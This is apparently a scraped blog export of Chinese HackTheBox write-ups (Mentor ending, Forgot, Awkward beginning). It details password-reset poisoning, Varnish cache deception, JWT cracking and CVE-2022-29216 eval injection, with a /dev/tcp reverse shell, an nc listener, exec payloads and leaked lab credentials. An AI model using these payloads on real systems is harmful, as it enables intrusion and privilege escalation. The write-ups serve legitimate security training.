查看/etc/snmp/snmpd.conf，可看到有个密码，站点属主是james，那应该就是james的密码（这个密码跟之前的密码不一样，可能前面的那个只是平台james管理员的密码，这个地方是linux终端james用户的密码） svc@mentor:/tmp$ cat /etc/snmp/snmpd.conf SuperSecurePassword123__ 切换到james用户，执行sudo -l可看到james用户有执行/bin/sh命令的权限 svc@mentor:/tmp$ su james Password: james@mentor:/tmp$ id uid=1000(james) gid=1000(james) groups=1000(james) james@mentor:/tmp$ sudo -l [sudo] password for james: Matching Defaults entries for james on mentor: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User james may run the following commands on mentor: (ALL) /bin/sh 执行/bin/sh，成功获取root权限 james@mentor:/tmp$ sudo /bin/sh # id uid=0(root) gid=0(root) groups=0(root) Over！ 总结 信息收集得到Swagger UI页面、SNMP服务、诸多有效目录； SNMP配置信息泄露管理员james密码； 登录james用户获取管理员JWT； 利用管理员JWT命令执行获取虚拟root权限； 发现PostgreSQL数据库，与之交互获取ssh账户； 登录ssh账户运行linpeas，从SNMP配置文件拿到james终端密码； 切换james终端用户，提权获取root权限。 参考Hackthebox Mentor Writeup：https://0xdedinfosec.vercel.app/blog/hackthebox-mentor-writeup 实战SNMP服务攻击：https://www.freebuf.com/articles/network/319234.html","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Forgot","slug":"HTB3-Forgot","date":"2023-03-15T08:45:05.000Z","updated":"2023-08-31T07:55:17.332Z","comments":true,"path":"posts/7f4bdc86.html","link":"","permalink":"https://wa0er.github.io/posts/7f4bdc86.html","excerpt":"","text":"HTB-Forgot信息搜集nmap ┌──(root💀kali)-[~/Desktop] └─# nmap -sC -sV 10.10.11.188 Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-06 02:21 EST Nmap scan report for 10.10.11.188 Host is up (0.62s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Werkzeug/2.1.2 Python/3.8.10 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 NOT FOUND | Server: Werkzeug/2.1.2 Python/3.8.10 | Date: Mon, 06 Mar 2023 07:20:37 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 207 | X-Varnish: 493857 493844 | Age: 71 | Via: 1.1 varnish (Varnish/6.2) | Connection: close | &lt;!doctype html&gt; | &lt;html lang=en&gt; | &lt;title&gt;404 Not Found&lt;/title&gt; | &lt;h1&gt;Not Found&lt;/h1&gt; | &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt; | GetRequest: | HTTP/1.1 302 FOUND | Server: Werkzeug/2.1.2 Python/3.8.10 | Date: Mon, 06 Mar 2023 07:21:38 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 219 | Location: http://127.0.0.1 | X-Varnish: 493852 | Age: 0 | Via: 1.1 varnish (Varnish/6.2) | Connection: close | &lt;!doctype html&gt; | &lt;html lang=en&gt; | &lt;title&gt;Redirecting...&lt;/title&gt; | &lt;h1&gt;Redirecting...&lt;/h1&gt; | &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=\"http://127.0.0.1\"&gt;http://127.0.0.1&lt;/a&gt;. If not, click the link. | HTTPOptions: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.8.10 | Date: Mon, 06 Mar 2023 07:21:40 GMT | Content-Type: text/html; charset=utf-8 | Allow: OPTIONS, GET, HEAD | Content-Length: 0 | X-Varnish: 264229 | Age: 0 | Via: 1.1 varnish (Varnish/6.2) | Accept-Ranges: bytes | Connection: close | RTSPRequest, SIPOptions: |_ HTTP/1.1 400 Bad Request |_http-server-header: Werkzeug/2.1.2 Python/3.8.10 |_http-title: Login 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.91%I=7%D=3/6%Time=64059482%P=x86_64-pc-linux-gnu%r(GetRe SF:quest,1E3,\"HTTP/1\\.1\\x20302\\x20FOUND\\r\\nServer:\\x20Werkzeug/2\\.1\\.2\\x20 SF:Python/3\\.8\\.10\\r\\nDate:\\x20Mon,\\x2006\\x20Mar\\x202023\\x2007:21:38\\x20GM SF:T\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2 SF:0219\\r\\nLocation:\\x20http://127\\.0\\.0\\.1\\r\\nX-Varnish:\\x20493852\\r\\nAge SF::\\x200\\r\\nVia:\\x201\\.1\\x20varnish\\x20\\(Varnish/6\\.2\\)\\r\\nConnection:\\x2 SF:0close\\r\\n\\r\\n&lt;!doctype\\x20html&gt;\\n&lt;html\\x20lang=en&gt;\\n&lt;title&gt;Redirecting SF:\\.\\.\\.&lt;/title&gt;\\n&lt;h1&gt;Redirecting\\.\\.\\.&lt;/h1&gt;\\n&lt;p&gt;You\\x20should\\x20be\\x20r SF:edirected\\x20automatically\\x20to\\x20the\\x20target\\x20URL:\\x20&lt;a\\x20href SF:=\\\"http://127\\.0\\.0\\.1\\\"&gt;http://127\\.0\\.0\\.1&lt;/a&gt;\\.\\x20If\\x20not,\\x20cli SF:ck\\x20the\\x20link\\.\\n\")%r(HTTPOptions,118,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nSe SF:rver:\\x20Werkzeug/2\\.1\\.2\\x20Python/3\\.8\\.10\\r\\nDate:\\x20Mon,\\x2006\\x20 SF:Mar\\x202023\\x2007:21:40\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charse SF:t=utf-8\\r\\nAllow:\\x20OPTIONS,\\x20GET,\\x20HEAD\\r\\nContent-Length:\\x200\\r SF:\\nX-Varnish:\\x20264229\\r\\nAge:\\x200\\r\\nVia:\\x201\\.1\\x20varnish\\x20\\(Var SF:nish/6\\.2\\)\\r\\nAccept-Ranges:\\x20bytes\\r\\nConnection:\\x20close\\r\\n\\r\\n\" SF:)%r(RTSPRequest,1C,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\r\\n\")%r(Four SF:OhFourRequest,1C7,\"HTTP/1\\.1\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20Werkz SF:eug/2\\.1\\.2\\x20Python/3\\.8\\.10\\r\\nDate:\\x20Mon,\\x2006\\x20Mar\\x202023\\x2 SF:007:20:37\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nCon SF:tent-Length:\\x20207\\r\\nX-Varnish:\\x20493857\\x20493844\\r\\nAge:\\x2071\\r\\n SF:Via:\\x201\\.1\\x20varnish\\x20\\(Varnish/6\\.2\\)\\r\\nConnection:\\x20close\\r\\n SF:\\r\\n&lt;!doctype\\x20html&gt;\\n&lt;html\\x20lang=en&gt;\\n&lt;title&gt;404\\x20Not\\x20Found&lt;/ SF:title&gt;\\n&lt;h1&gt;Not\\x20Found&lt;/h1&gt;\\n&lt;p&gt;The\\x20requested\\x20URL\\x20was\\x20not SF:\\x20found\\x20on\\x20the\\x20server\\.\\x20If\\x20you\\x20entered\\x20the\\x20UR SF:L\\x20manually\\x20please\\x20check\\x20your\\x20spelling\\x20and\\x20try\\x20a SF:gain\\.&lt;/p&gt;\\n\")%r(SIPOptions,1C,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\ SF:r\\n\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 190.69 seconds 开放端口：22（SSH）、80（HTTP），并且观察到http-server-header是Werkzeug/2.1.2和Python/3.8.10，那么就极有可能是Flask框架 访问10.10.11.188，是个登录页面，可以爆破，但这不是上策 查看页面源码，发现如下注释内容 暴露了用户robert-dev-14522，而且在/static目录加载了很多js文件 点击FOGOT THE PASSWORD?，跳转到如下/forogt页面，需要输入用户名 输入admin，会提示admin用户的密码不能被重置 随便输入其他用户名，会提示无效用户名 随便访问一个目录，404页面 google一下404页面内容，基本确定是flask框架 用feroxbuster爆一下目录 ┌──(root💀kali)-[~/Desktop] └─# feroxbuster -u http://10.10.11.188/ ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \"epi\" Risher 🤓 ver: 2.7.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.188/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.7.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 246l 484w 5186c http://10.10.11.188/ 200 GET 246l 484w 5189c http://10.10.11.188/login 302 GET 5l 22w 189c http://10.10.11.188/home =&gt; http://10.10.11.188/ 302 GET 5l 22w 189c http://10.10.11.188/tickets =&gt; http://10.10.11.188/ 200 GET 253l 498w 5227c http://10.10.11.188/forgot 200 GET 261l 517w 5523c http://10.10.11.188/reset [####################] - 3m 30000/30000 0s found:6 errors:0 [####################] - 3m 30000/30000 154/s http://10.10.11.188/ 五个目录：/login、/home、/tickets、/forgot、/reset /login是默认登陆页面，/forgot刚访问过，/home和/tickets会重定向到登陆页面，那就试试访问/reset，可以访问，相当于跳过了/forgot页面输入用户名的过程 随便输入密码，发现会提示无效token，那说明还是要回到/forgot页面，想办法拿到token 回到/forgot页面，输入刚才发现的用户名robert-dev-14522，看提示，应该是有效用户，但重置密码的链接发送到用户收件箱 重置密码功能投毒参考https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning 盘一盘重置密码的逻辑： 第一步，用户输入用户名，提交重置密码请求； 第二步，服务器检查用户名是否存在，然后生成一个临时token，连带token返回一个重置密码的链接到用户的inbox； 第三步，用户访问重置密码链接，服务器验证token，token一致则可以重置密码，否则提示token无效 那么我们可以在第一步，截获用户提交的重置密码请求，修改HTTP头部Host字段值为攻击机IP，然后在攻击机IP开启http服务监听，当服务器做完第二步返回带token的重置密码的链接时，攻击机就可以收到此响应。 攻击机开启监听 python3 -m http.server 80 用刚才的robert-dev-14522用户重新发送重置密码请求，截获请求包，修改host字段为本地ip，点击send 稍等片刻，我们就收到了服务器的响应，是个带有token的重置密码URL ┌──(root💀kali)-[~/Desktop] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.188 - - [06/Mar/2023 04:02:02] code 404, message File not found 10.10.11.188 - - [06/Mar/2023 04:02:02] \"GET /reset?token=ZSDRCRl0pCgor%2FJNZl%2BgMY%2FMKBEBlPFYJZSdq4Yiti3oiS6qX3ipoFp4wFP5zD1EFR6R4oD11M4ht8kJ0X8S3w%3D%3D HTTP/1.1\" 404 - 浏览器访问带token的重置密码URL，可看到成功重置密码 然后成功登录主页面，查看各个页面，大致剖析一下这网站功能：就是网站用户如果遇到一些权限相关的问题时（比如无法访问某站点、想做一些比自己权限高的事情），可以在[Escalate]页面提交提权申请，然后Tickets就会显示各个用户提交申请的相关信息，比如用户因为什么问题需要提权、哪个用户提交的、该用户现在的权限状态是怎样的。这个逻辑没盘明白，后面可能会一头雾水。 点击Tickets，可看到一个表格，表格最后一栏显示Diego用户的SSH凭证不能用，而且此用户权限已被提升，那么我们试图查看已被提权的页面[Tickets(escalated)] 却发现Tickets(escalated)无法点击，有点可疑，F12查看有目录/admin_tickets，已提权的用户应该给的是admin权限，那么Diego用户应该就被提升到admin权限了，那么我们就可以尝试以admin身份登录网站，从而看到Diego用户的用户名密码，也就是SSH的用户名密码。F12把class值删除或者直接访问/admin_tickets目录都无效，会跳转到http://10.10.11.188/home?err=ACCESS_DENIED web缓存欺骗回头看nmap的扫描结果，HTTP响应有两个罕见的字段X-Varnish和Via HTTP/1.1 200 OK Server: Werkzeug/2.1.2 Python/3.8.10 Date: Mon, 06 Mar 2023 07:21:40 GMT Content-Type: text/html; charset=utf-8 Allow: OPTIONS, GET, HEAD Content-Length: 0 X-Varnish: 264229 Age: 0 Via: 1.1 varnish (Varnish/6.2) Accept-Ranges: bytes Connection: close Varnish是一个用作缓存的反向代理程序 X-Varnish是Varnish生成的ID号 Via在此处相当于指明网站服务用的HTTP/1.1和Varnish/6.2 参考https://labs.withsecure.com/advisories/plone-cms-cache-poisoning-xss-vulnerability 前面在源码看到网站在/static目录加载了很多信息，而且有反向代理Varnish作缓存，那么就用curl测试一下HTTP响应头部字段，如下，可看到curl -I \"http://10.10.11.188/\"响应头无cache-control字段 ┌──(root💀kali)-[~/Desktop] └─# curl -I \"http://10.10.11.188/\" HTTP/1.1 200 OK Server: Werkzeug/2.1.2 Python/3.8.10 Date: Tue, 07 Mar 2023 03:50:02 GMT Content-Type: text/html; charset=utf-8 Content-Length: 5186 X-Varnish: 596113 Age: 0 Via: 1.1 varnish (Varnish/6.2) Accept-Ranges: bytes Connection: keep-alive 如下，curl -I \"http://10.10.11.188/static/\"响应头有cache-control字段，而且该字段设置的权限是public，即可向任意方提供缓存 ┌──(root💀kali)-[~/Desktop] └─# curl -I \"http://10.10.11.188/static/\" HTTP/1.1 404 NOT FOUND Server: Werkzeug/2.1.2 Python/3.8.10 Date: Mon, 06 Mar 2023 14:44:46 GMT Content-Type: text/html; charset=utf-8 Content-Length: 207 cache-control: public, max-age=240 X-Varnish: 137222 1902052 Age: 47073 Via: 1.1 varnish (Varnish/6.2) Connection: keep-alive curl -I \"http://10.10.11.188/static/wa0er\"响应头有cache-control字段 ┌──(root💀kali)-[~/Desktop] └─# curl -I \"http://10.10.11.188/static/wa0er\" HTTP/1.1 404 NOT FOUND Server: Werkzeug/2.1.2 Python/3.8.10 Date: Tue, 07 Mar 2023 03:49:24 GMT Content-Type: text/html; charset=utf-8 Content-Length: 207 cache-control: public, max-age=240 X-Varnish: 137236 Age: 0 Via: 1.1 varnish (Varnish/6.2) Connection: keep-alive 继续测试，得到如下结果 curl -I \"http://10.10.11.188/staticwa0er\" #有cache-control字段 curl -I \"http://10.10.11.188/wa0er/static\" #有cache-control字段 curl -I \"http://10.10.11.188/wa0erstatic\" #无cache-control字段 由此推测，Varnish应该是匹配”/static”字符串，匹配成功，则返回缓存信息。我们肯定没法通过网站正常的提交提权申请的流程去获得admin权限，但知道用Varnish做了缓存，且cache-control字段有public，那么我们就可以尝试读缓存。 在[Escalate]页面，Link内容填写带有/static的URL，提交提权申请 然后在本地执行curl请求对应的URL，获取session值（在burp抓包重放也可以） curl -I http://10.10.11.188/static/wa0er Set-Cookie: session=c0204f3b-c808-47db-ad92-7e4abbebe2be; HttpOnly; Path=/ F12→Storage→Cookies，session值改为获取到的session值 重新访问http://10.10.11.188/admin_tickets 可以看到获取到了diego账户密码 diego dCb#1!x0%gjq ssh连上去 权限提升前面知道diego用户已被提权，所以应该是有sudo权限，可以执行sudo -l看一下diego用户权限，发现有个/opt/security/ml_security.py可以执行 看一下内容 #!/usr/bin/python3 import sys import csv import pickle import mysql.connector import requests import threading import numpy as np import pandas as pd import urllib.parse as parse from urllib.parse import unquote from sklearn import model_selection from nltk.tokenize import word_tokenize from sklearn.linear_model import LogisticRegression from gensim.models.doc2vec import Doc2Vec, TaggedDocument from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string np.random.seed(42) f1 = '/opt/security/lib/DecisionTreeClassifier.sav' f2 = '/opt/security/lib/SVC.sav' f3 = '/opt/security/lib/GaussianNB.sav' f4 = '/opt/security/lib/KNeighborsClassifier.sav' f5 = '/opt/security/lib/RandomForestClassifier.sav' f6 = '/opt/security/lib/MLPClassifier.sav' # load the models from disk loaded_model1 = pickle.load(open(f1, 'rb')) loaded_model2 = pickle.load(open(f2, 'rb')) loaded_model3 = pickle.load(open(f3, 'rb')) loaded_model4 = pickle.load(open(f4, 'rb')) loaded_model5 = pickle.load(open(f5, 'rb')) loaded_model6 = pickle.load(open(f6, 'rb')) model= Doc2Vec.load(\"/opt/security/lib/d2v.model\") # Create a function to convert an array of strings to a set of features def getVec(text): features = [] for i, line in enumerate(text): test_data = word_tokenize(line.lower()) v1 = model.infer_vector(test_data) featureVec = v1 lineDecode = unquote(line) lowerStr = str(lineDecode).lower() feature1 = int(lowerStr.count('link')) feature1 += int(lowerStr.count('object')) feature1 += int(lowerStr.count('form')) feature1 += int(lowerStr.count('embed')) feature1 += int(lowerStr.count('ilayer')) feature1 += int(lowerStr.count('layer')) feature1 += int(lowerStr.count('style')) feature1 += int(lowerStr.count('applet')) feature1 += int(lowerStr.count('meta')) feature1 += int(lowerStr.count('img')) feature1 += int(lowerStr.count('iframe')) feature1 += int(lowerStr.count('marquee')) # add feature for malicious method count feature2 = int(lowerStr.count('exec')) feature2 += int(lowerStr.count('fromcharcode')) feature2 += int(lowerStr.count('eval')) feature2 += int(lowerStr.count('alert')) feature2 += int(lowerStr.count('getelementsbytagname')) feature2 += int(lowerStr.count('write')) feature2 += int(lowerStr.count('unescape')) feature2 += int(lowerStr.count('escape')) feature2 += int(lowerStr.count('prompt')) feature2 += int(lowerStr.count('onload')) feature2 += int(lowerStr.count('onclick')) feature2 += int(lowerStr.count('onerror')) feature2 += int(lowerStr.count('onpage')) feature2 += int(lowerStr.count('confirm')) # add feature for \".js\" count feature3 = int(lowerStr.count('.js')) # add feature for \"javascript\" count feature4 = int(lowerStr.count('javascript')) # add feature for length of the string feature5 = int(len(lowerStr)) # add feature for \"&lt;script\" count feature6 = int(lowerStr.count('script')) feature6 += int(lowerStr.count('&lt;script')) feature6 += int(lowerStr.count('&amp;lt;script')) feature6 += int(lowerStr.count('%3cscript')) feature6 += int(lowerStr.count('%3c%73%63%72%69%70%74')) # add feature for special character count feature7 = int(lowerStr.count('&amp;')) feature7 += int(lowerStr.count('&lt;')) feature7 += int(lowerStr.count('&gt;')) feature7 += int(lowerStr.count('\"')) feature7 += int(lowerStr.count('\\'')) feature7 += int(lowerStr.count('/')) feature7 += int(lowerStr.count('%')) feature7 += int(lowerStr.count('*')) feature7 += int(lowerStr.count(';')) feature7 += int(lowerStr.count('+')) feature7 += int(lowerStr.count('=')) feature7 += int(lowerStr.count('%3C')) # add feature for http count feature8 = int(lowerStr.count('http')) # append the features featureVec = np.append(featureVec,feature1) featureVec = np.append(featureVec,feature2) featureVec = np.append(featureVec,feature3) featureVec = np.append(featureVec,feature4) featureVec = np.append(featureVec,feature5) featureVec = np.append(featureVec,feature6) featureVec = np.append(featureVec,feature7) featureVec = np.append(featureVec,feature8) features.append(featureVec) return features # Grab links conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq') cursor = conn.cursor() cursor.execute('select reason from escalate') r = [i[0] for i in cursor.fetchall()] conn.close() data=[] for i in r: data.append(i) Xnew = getVec(data) #1 DecisionTreeClassifier ynew1 = loaded_model1.predict(Xnew) #2 SVC ynew2 = loaded_model2.predict(Xnew) #3 GaussianNB ynew3 = loaded_model3.predict(Xnew) #4 KNeighborsClassifier ynew4 = loaded_model4.predict(Xnew) #5 RandomForestClassifier ynew5 = loaded_model5.predict(Xnew) #6 MLPClassifier ynew6 = loaded_model6.predict(Xnew) # show the sample inputs and predicted outputs def assessData(i): score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i])) if score &gt;= .5: try: preprocess_input_exprs_arg_string(data[i],safe=False) except: pass for i in range(len(Xnew)): t = threading.Thread(target=assessData, args=(i,)) # t.daemon = True t.start() 分析一下代码功能 从app数据库escalate表的reason列取值（代码112-121行），将此值作为输入，匹配其中的特征字段（代码45-98行的feature）作为特征向量（不必纠结特征向量是个什么东西） 然后用若干种机器学习模型（代码123-134行）去预测输出 最后对输出把输入和输出都序列化成某种数据格式（代码136-148，这里的数据格式不必过分纠结，估计是为了看着方便） 注意：有个前提，匹配到了相关特征字段，才会有可能满足序列化数据的条件（具体可看score参数的传递链），才会执行第3步，从而才会去执行preprocess_input_exprs_arg_string(data[i],safe=False) 那么有连接数据库的操作，用户名密码依然是diego的用户名密码 问题就出现在preprocess_input_exprs_arg_string(data[i],safe=False)，google搜了一下，是CVE-2022-29216，可以代码注入 参考https://github.com/advisories/GHSA-75c9-jrh4-79mc 稍微分析一下这个CVE原理，下面代码段是存在漏洞的版本（tensorflow2.6.3）preprocess_input_exprs_arg_string()函数的源码，主要问题就在于safe参数如果设为false，那么第12行判断if safe就会返回布尔0，从而跳转到18行else，然后执行eval(expr)，分析expr参数传递路线，也就是执行了input_exprs_str第一个等号后的表达式 def preprocess_input_exprs_arg_string(input_exprs_str, safe=True): \"\"\" ...... \"\"\" input_dict = {} for input_raw in filter(bool, input_exprs_str.split(';')): if '=' not in input_exprs_str: raise RuntimeError('--input_exprs \"%s\" format is incorrect. Please follow' '\"&lt;input_key&gt;=&lt;python expression&gt;\"' % input_exprs_str) input_key, expr = input_raw.split('=', 1) if safe: try: input_dict[input_key] = ast.literal_eval(expr) except: raise RuntimeError( f'Expression \"{expr}\" is not a valid python literal.') else: # ast.literal_eval does not work with numpy expressions input_dict[input_key] = eval(expr) # pylint: disable=eval-used return input_dict 综上分析，我们可以在app数据库escalate表的reason列插入一个键值对（a=b格式），键名称任意，值为构造好的python代码（因为最终是代入到/opt/security/ml_security.py文件执行），其中包含执行反弹shell文件的代码，且包含刚才分析所提到的特征字段的任意一个，示例如下 hello=exec(\"\"\"\\nimport os\\nos.system(\"/tmp/wa0er_rev.sh\")\\nprint(\"%3CSCRIPT%3Ealert%28%22wa0er%22%29%3C/SCRIPT%3E\")\"\"\") 开始操作，看一下tensorflow的版本是2.6.3，是漏洞存在的版本 diego@forgot:~$ pip show tensorflow Name: tensorflow Version: 2.6.3 Summary: TensorFlow is an open source machine learning framework for everyone. Home-page: https://www.tensorflow.org/ Author: Google Inc. Author-email: packages@tensorflow.org License: Apache 2.0 Location: /usr/local/lib/python3.8/dist-packages Requires: keras, h5py, grpcio, tensorflow-estimator, termcolor, opt-einsum, six, keras-preprocessing, protobuf, tensorboard, absl-py, google-pasta, wrapt, wheel, flatbuffers, typing-extensions, gast, astunparse, numpy, clang Required-by: 在/tmp目录写一个反弹shell文件 diego@forgot:~$ vim /tmp/wa0er_rev.sh #!/bin/bash bash -i &gt;&amp; /dev/tcp/[本地IP]/[本地PORT] 0&gt;&amp;1 diego@forgot:~$ chmod +x /tmp/wa0er_rev.sh 连接mysql 进到app数据库 执行如下sql语句，在escalate表里插入内容 insert into escalate values (\"wa0er\",\"wa0er\",\"wa0er\",'hello=exec(\"\"\"\\nimport os\\nos.system(\"/tmp/wa0er_rev.sh\")\\nprint(\"%3CSCRIPT%3Ealert%28%22wa0er%22%29%3C/SCRIPT%3E\")\"\"\")'); 可以看到第四列reason有我们注入的代码 开启nc监听 nc -nvlp [PORT] 执行脚本 sudo /opt/security/ml_security.py 拿到root，Over！ 总结 信息搜集暴露信息：①页面源码暴露用户robert-dev-14522；②暴露varnish反向代理缓存可利用点（路径匹配/script）； 重置密码功能投毒成功修改robert-dev-14522密码，登录网站； Varnish缓存欺骗登录admin用户，获取SSH用户diego； SSH连接发现关键文件ml_security.py； 代码审计+CVE-2022-29216命令执行反弹shell获取root权限。 参考https://0xdf.gitlab.io/2023/03/04/htb-forgot.html https://infosecwriteups.com/forgot-hack-the-box-walkthrough-htb-e571fd151f9a https://www.usenix.org/conference/usenixsecurity20/presentation/mirheidari","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Awkward","slug":"HTB2-Awkward","date":"2023-03-11T07:27:13.000Z","updated":"2023-08-31T07:55:20.218Z","comments":true,"path":"posts/d776b19d.html","link":"","permalink":"https://wa0er.github.io/posts/d776b19d.html","excerpt":"","text":"HTB-Awkward信息收集Nmap ┌──(root💀kali)-[~/桌面] └─# nmap -sC -sV 10.10.11.185 Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-16 21:53 EST Nmap scan report for 10.10.11.185 Host is up (0.35s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA) |_ 256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.48 seconds 开放端口：22（SSH）、80（HTTP） 80端口开放，直接URL打开IP，跳转到hat-valley.htb，那就添加进本地hosts文件 echo \"10.10.11.185 hat-valley.htb\" &gt;&gt; /etc/hosts 目录扫描 dirsearch -u http://hat-valley.htb/ 继续扫js目录 dirsearch -u http://hat-valley.htb/js app.js搜href，发现几个可疑目录/dashboard、/leave、/hr，依次打开，发现全部都会跳转到/hr，是个登录界面 随便试，都会报用户名或密码错误，用Burp抓包发现Cookie字段有token=guest burp直接修改成token=admin或者token=administrator，重放请求包，还是不行 用插件Cookie Editor编辑token值为admin，刷新页面，发现页面跳转到/dashboard 或者也可以浏览器F12→Storage→Cookies修改、刷新页面，一样的效果 打开左侧菜单栏【Leave Requests】页面，留意到所有的离开请求会由Christine审核，猜测Christine应该是个权限不小的账户 然后在F12→Network→XHR（XMLHttpRequest）看到有两个api文件 分别访问http://hat-valley.htb/api/staff-details和http://hat-valley.htb/api/store-status，/api/store-status页面没什么东西，/api/staff-details有jwt malformed报错信息 JsonWebTokenError: jwt malformed at Object.module.exports [as verify] (/var/www/hat-valley.htb/node_modules/jsonwebtoken/verify.js:63:17) at /var/www/hat-valley.htb/server/server.js:151:30 at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5) at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13) at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3) at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5) at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15 at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12) at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10) at cookieParser (/var/www/hat-valley.htb/node_modules/cookie-parser/index.js:71:5) jwt malformed报错是因为前端上传token的时候没有进行非空验证，导致token传给了服务端，这样就和服务端生成的token重复了。那么我们用CookieEditor插件或者F12删除cookie的token字段，也就是删除cookie，刷新页面，可以看到有四个用户 username \"christine.wool\" password \"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649\" username \"christopher.jones\" password \"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1\" username \"jackson.lightheart\" password \"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436\" username \"bean.hill\" password \"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f\" 目测是64*4=256位Hash，在线解一下 解出来一个用户 christopher.jones chris123 那么我们重新回到http://hat-valley.htb/hr页面，登录这个账户 看到Staff Details，果然，前面的判断没错，Christine是CEO，权限不小，还有两个销售和一个系统管理员 并且拿到了JWT token 用脚本把这个JWT token转换成john格式，然后用john工具破解 https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py &gt; python3 jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY3MDE3MTU3fQ.M5Yx5hMqtxf3hxrIJSjdLSdubkP6gFPtGzwsDDr7voI &gt; jwt_hash #!/usr/bin/env python3 import sys from jwt.utils import base64url_decode from binascii import hexlify def jwt2john(jwt): \"\"\" Convert signature from base64 to hex, and separate it from the data by a # so that John can parse it. \"\"\" jwt_bytes = jwt.encode('ascii') parts = jwt_bytes.split(b'.') data = parts[0] + b'.' + parts[1] signature = hexlify(base64url_decode(parts[2])) return (data + b'#' + signature).decode('ascii') if __name__ == \"__main__\": if len(sys.argv) != 2: print(\"Usage: %s JWT\" % sys.argv[0]) else: john = jwt2john(sys.argv[1]) print(john) &gt; john -w=/usr/share/wordlists/rockyou.txt jwt_hash 获取到JWT 